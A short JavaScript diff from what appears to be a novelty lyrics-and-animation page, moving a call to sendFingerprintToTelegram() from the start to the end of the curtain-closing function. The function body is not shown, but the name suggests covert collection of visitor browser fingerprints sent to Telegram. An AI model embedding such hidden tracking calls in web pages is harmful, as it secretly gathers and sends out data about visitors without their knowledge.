@@ -143,7 +143,6 @@ function opp(){
 }
 
 function cloo(){
-    sendFingerprintToTelegram();
     printLyrics();
     Vidd.src = "curtain-close.mp4";
     Vidd.load();
@@ -151,6 +150,7 @@ function cloo(){
     music.play();
     abt.style.opacity = "1";
     abt.style.opacityDuration = "2s"
+    sendFingerprintToTelegram();
 }
 
 function printLyrics() {
